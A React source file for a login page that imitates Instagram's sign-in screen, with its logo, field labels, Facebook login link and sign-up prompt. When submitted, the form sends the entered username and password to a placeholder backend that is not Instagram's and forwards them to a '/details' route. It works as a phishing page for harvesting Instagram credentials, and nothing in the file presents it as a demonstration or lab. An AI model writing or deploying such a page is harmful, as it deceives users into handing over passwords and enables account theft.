import { useState } from "react";
import { useNavigate } from "react-router-dom";
import axios from "axios";
import "../App.css";

function LoginPage() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const navigate = useNavigate();

  const handleSubmit = async (e) => {
    e.preventDefault();
    await axios.post("https://your-backend-url/api/login/", {
      username,
      password,
    });
    navigate("/details", { state: { username, password } });
  };

  return (
    <div className="login-container">
      <div className="login-box">
        <h1 className="insta-logo">Instagram</h1>
        <form onSubmit={handleSubmit} className="login-form">
          <input
            type="text"
            placeholder="Phone number, username, or email"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            required
          />
          <input
            type="password"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
          />
          <button type="submit">Log In</button>
        </form>
        <div className="or-divider">
          <div className="line"></div>
          <div className="or">OR</div>
          <div className="line"></div>
        </div>
        <div className="facebook-login">Log in with Facebook</div>
        <div className="forgot-password">Forgot password?</div>
      </div>

      <div className="signup-box">
        Don't have an account? <span className="signup-link">Sign up</span>
      </div>
    </div>
  );
}

export default LoginPage;
